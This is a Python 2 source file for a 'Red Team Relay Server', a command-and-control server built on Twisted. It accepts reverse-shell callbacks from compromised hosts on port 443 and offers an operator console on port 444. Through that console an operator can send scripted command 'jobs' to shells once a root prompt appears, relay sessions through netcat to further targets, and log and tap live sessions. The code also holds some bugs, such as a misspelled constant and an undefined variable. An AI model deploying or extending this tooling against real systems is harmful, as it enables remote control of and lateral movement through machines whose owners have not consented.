#!/usr/bin/python2

from twisted.internet.protocol import Factory
from twisted.protocols.basic import LineReceiver
from twisted.conch import recvline
from twisted.internet import reactor, protocol, defer
from os.path import isfile, join
import pdb, datetime, re, os, stat

LISTEN_PORT = 443 # Your callbacks should be sent here
COMMAND_PORT = 444 # Port to interact with server
NETCAT = '/bin/nc' 
PROMPT = r'# $' #default shell prompt

class Listener(LineReceiver):
	
	def __init__(self, hosts, sched, conn, jobs):
		self.hosts = hosts 	# List of called in hosts    [host, time]
		self.sched = sched	# List of scheduled relays   [host, target, port, count]
		self.conn = conn 	# List of established relays [host, target, port, netcat_instance]
		self.jobs = jobs	# List of scheduled jobs     [host, job, prompt, count]
		self.nc = None
		self.job = None		

	def connectionMade(self):
		host = self.transport.getPeer().host
		print "Connected: ", host

		for record in self.hosts: # Remove old record of last call-in if this one is new
			if host in record:
				self.hosts.remove(record)
		
		self.hosts.append([host, datetime.datetime.now()]) # Add record of call-in with ip and time

		if self.sched:
			for record in self.sched:
				shost, target, port, count = record
				if shost == host: # We got a relay to setup
					cmd = [NETCAT, target, port]
					cwd = '/tmp'
						
					self.nc = ProcessProtocol(self, [host, target])	
					reactor.spawnProcess(self.nc, cmd[0], cmd, {}, cwd)
					self.conn.append([host, target, port, self.nc])

					if count == 1:
						self.sched.remove(record)
					if count >= 1:
						record[3] -= 1

		if self.jobs:
			for shost, job, p, c in self.jobs:
				if shost == host:
					self.job = 1

		#Kill it if we got nothing for the callback
		if not self.job and not self.nc:
			self.transport.loseConnection()

	def dataReceived(self, data):
		if self.nc != None:
			self.nc.transport.write(data)
			self.nc.log.write(data) #TODO Handle exceptions here
			self.nc.log.flush()

		if self.jobs:
			for host, target, port in self.conn:
				if host == self.transport.getPeer().host:
					return # Don't muck with established connections. 
			for job in self.jobs:
				shost, filename, prompt, count = job
				if shost == self.transport.getPeer().host:
					if re.search(prompt, data): # Found prompt. Lets start sending our job over.
						with open(os.getcwd() + "/jobs/" + filename) as jobfile:
							for line in jobfile.readlines():
								self.sendLine(line)
						print "Completed " + filename
						self.transport.loseConnection()
						if count == 1:
							self.jobs.remove(job)
						if count > 1:
							job[3] -= 1 
								
	def connectionLost(self, reason):
		if self.nc != None:
			self.nc.transport.loseConnection()
			self.nc.log.close()

class ProcessProtocol(protocol.ProcessProtocol):
	
	def __init__(self, nc, conn):
		self.nc = nc
		host, target = conn
		self.log = open(os.getcwd() + "/sessions/" + host + "--" + target, "a") #TODO: Handle exception
			
	def outReceived(self, data):
		self.nc.transport.write(data)
		self.log.write(data)
		self.log.flush()

	def processEnded(self, reason):
		if self.nc.conn:
			for record in self.nc.conn:
				if self.nc.transport.getPeer().host == record[0]:
					self.nc.conn.remove(record)

		self.nc.transport.loseConnection()
		self.log.close()

class ListenerFactory(Factory):

	def __init__(self):
		self.hosts = []
		self.sched = []
		self.conn = []
		self.jobs = []
		
	def buildProtocol(self, addr):
		return Listener(self.hosts, self.sched, self.conn, self.jobs)

class Control(recvline.HistoricRecvLine):
	
	def __init__(self, listener):
		self.hosts = listener.hosts
		self.tap = []
		self.state = "MENU"
		self.name = "--- Red Team Relay Server v0.6 ---\nListening on Port: " + str(LISTEN_PORT) + "\n\n"
		self.help = "--------------------------------------\nshow  - Show last connections. Specify a regex to filter the list\nlist  - List scheduled relays, active relays, and jobs\nadd   - Add relay (ex. add <host> <target> <port> (<times to run> 0 for forever)\n        Add job (ex. add <host or all> <job> (<times to run> 0 for forever))\ndel   - Delete relay(s) (ex. del <target> or del all)\n        Delete job (ex. del <target or all> <job>)\nclean - Clear out last connections cache\njobs  - Show available jobs. Specify a job name to view the job\ntap   - Show viewable sessions. Specify session # to tap into.\n--------------------------------------\n"

	def connectionMade(self):
		#recvline.HistoricRecvLine.connectionMade(self)
		self.terminal.write(self.name + "(type help for commands)\n> ") #Show prompt
	
	def dataReceived(self, line):
		if self.state == "MENU":
			self.handle_menu(line)

		if self.state == "TAP":
			if re.match(r'^q$', line):
				self.state = "MENU"
				self.terminal.write("Exiting tap..\n\n> ")
			else:
				taphost, taptarget, firsttap = self.tap
				if firsttap:  
					self.tap[2] = False
					self.terminal.write("# ")
					return
				for host, target, port, obj in listener.conn:
					if host == taphost and target == taptarget:
						obj.transport.write(line) #client
						obj.nc.transport.write(line) #server
			
	def handle_menu(self, cmd):
		if re.match(r'^(quit|exit)|(q|e)', cmd):
			self.terminal.loseConnection()
			return

		elif re.match(r'^c', cmd):
			listener.hosts = []

		# Show last connections
		elif re.match(r'^s', cmd):
			self.hosts = listener.hosts
			if self.hosts:
				if len(cmd.split()) == 2:
					for h,d in self.hosts:
						if re.search(cmd.split()[1], h): self.terminal.write(str(h) + "     -- " + d.strftime("%I:%M%p") + "\n")
				else:
					for h,d in self.hosts:
						self.terminal.write(str(h) + "     -- " + d.strftime("%I:%M%p") + "\n")
			else:
				self.terminal.write("No connections\n")

		# Add jobs and relays
		elif re.match(r'^a', cmd):
			ipregex = r'([0-9]{1,3}\.){3}[0-9]{1,3}'
			args = len(cmd.split())
			count = 1 # Default.

			if args == 4 or args == 5:
				if args == 5:
					c, host, target, port, count = cmd.split()
				else:
					c, host, target, port = cmd.split()

				#schedule relay
				if re.match(ipregex, host) and re.match(ipregex, target) and re.match(r'[0-9]{1,5}', port):
					listener.sched.append([host, target, port, int(count)])	

				#schedule job
				elif re.match(ipregex,host) and re.match(r'[a-zA-Z0-9]+', target):
					if re.match(r'[0-9]+', port):
						listener.jobs.append([host, target, PROMPT, int(port)]) #host, job, default prompt, count
					elif count > 0:
						listener.jobs.append([host, target, port, count]) #host, job, prompt, count
					else:
						listener.jobs.append([host, target, port, None]) #host, job, prompt, default count
				
				#schedule job for all callbacks for a set number of times 
				elif re.match(r'all', host) and re.match(r'[a-zA-Z0-9]+', target) and re.match(r'[0-9]+', port):
					for h, time in listener.hosts:
						listener.jobs.append([h, job, PORMPT, int(port)])
				
				else:
					self.terminal.write("Your command was weird\n")

			if args == 3:
				c, host, job = cmd.split()

				#schedule job for a callback
				if re.match(ipregex, host) and re.match(r'[a-zA-Z0-9]+', job):
					listener.jobs.append([host, job, PROMPT, None])

				#schedule job for all callbacks
				if re.match(r'all', host) and re.match(r'[a-zA-Z0-9]+', job):
					for h, time in listener.hosts:
						listener.jobs.append([h, job, PROMPT, None])

		# Delete jobs and relays
		elif re.match(r'^d', cmd):
			if len(cmd.split()) == 3:
				c, host, job = cmd.split()
				for record in listener.jobs:
					if host in record and job in record:
						listener.jobs.remove(record)
				#delete all jobs
				if re.match(r'^a', host) and re.match(r'^j', job):
					listener.jobs = []

			if len(cmd.split()) == 2:
				c, host = cmd.split()
				#delete all relays
				if re.match(r'^a', host):
					listener.sched = []	
				elif re.match(r'[a-zA-Z0-9]+', host):
					for record in listener.jobs:
						if host in record:
							listener.jobs.remove(record)
				else:
					for record in listener.sched:
						if host in record:
							listener.sched.remove(record)
			
		# List connections, relays, and jobs
		elif re.match(r'^l', cmd):
			showsched = showconn = showjobs = False
			if len(cmd.split()) == 2:
				if re.match(r'r',cmd.split()[1]): showsched = True
				if re.match(r'c',cmd.split()[1]): showconn = True
				if re.match(r'j',cmd.split()[1]): showjobs = True
			else:
				showsched = showconn = showjobs = True

			if listener.sched and showsched:
				self.terminal.write("--- Relays ---\n")
				for host, target, port, count in listener.sched:
					if count == 0:
						self.terminal.write(host + " will be relayed to " + target + " on port " + port + "\n")
					else:
						self.terminal.write(host + " will be relayed to " + target + " on port " + port + " " + str(count) + " more times" + "\n")
			if listener.conn and showconn:
				self.terminal.write("\n--- Connections ---\n")
				for host, target, port, obj in listener.conn:
					self.terminal.write(host + " --> " + target + ":" + port + "\n")
			
			if listener.jobs and showjobs:
				self.terminal.write("\n--- Jobs ---\n")
				for host, job, p, count in listener.jobs:
					if count == None:
						self.terminal.write(host + " --> " + job + "\n")
					else:
						self.terminal.write(host + " --> " + job + " '" + str(count) + "' more times" + "\n")

		# Show and add jobs
		elif re.match(r'^j', cmd):
			path = os.getcwd() + "/jobs/"
			if len(cmd.split()) == 2:
				c, filename = cmd.split()
				with open(path + filename) as jobfile: #TODO handle exceptions
					for line in jobfile.readlines():
						self.terminal.write(line + "\n")
			else:
				jobs = [ f for f in os.listdir(path) if isfile(join(path,f)) ]
				for j in jobs:
					self.terminal.write(j + "\n")
				
		# Tap into a session
		elif re.match(r'^t', cmd):
			if len(cmd.split()) == 2:
				for i, (host, target, port, obj) in enumerate(listener.conn):
					if i == int(cmd.split()[1]):
						self.terminal.write("Tapping into session.. enter 'q' to quit\n")
						self.state = "TAP"
						self.tap = [host, target, True]
						session = os.getcwd() + "/sessions/" + host + "--" + target
						self.tailfile(session, self.terminal.write)
						return
			else:
				self.terminal.write("Available sessions\n------------\n")
				for i, (host, target, port, obj) in enumerate(listener.conn):
					self.terminal.write(str(i) + ": " + host + " --> " + target + ":" + port + "\n")

		elif re.match(r'h', cmd):
			self.terminal.write(self.help)	
		
		else:
			self.terminal.write("What you talkin' bout Willis?\n")
		
		self.terminal.write("\n> ") #newline after every input.
			
	def file_identity(self, struct_stat):
		return struct_stat[stat.ST_DEV], struct_stat[stat.ST_INO]

	def tailfile(self, filename, callback, freq=1, fileobj=None, fstat=None):
	    	if fileobj is None:
			fileobj = open(filename)
			fileobj.seek(0, 2)
		line = fileobj.read()
		if line: callback(line)
	    	if fstat is None: fstat = os.fstat(fileobj.fileno())
	    	try: stat = os.stat(filename)
	    	except: stat = fstat
	    	if self.file_identity(stat) != self.file_identity(fstat):
			fileobj = open(filename)
			fstat = os.fstat(fileobj.fileno())
		if self.state == "TAP": #kill the loop if state is switched
			reactor.callLater(freq, lambda: self.tailfile(filename, callback, freq, fileobj, fstat))	

class ControlFactory(Factory):
	def __init__(self, listener):
		self.listener = listener

	def buildProtocol(self, addr):
		return Control(self.listener)

listener = ListenerFactory()
reactor.listenTCP(LISTEN_PORT, listener)
reactor.listenTCP(COMMAND_PORT, ControlFactory(listener))
reactor.run()
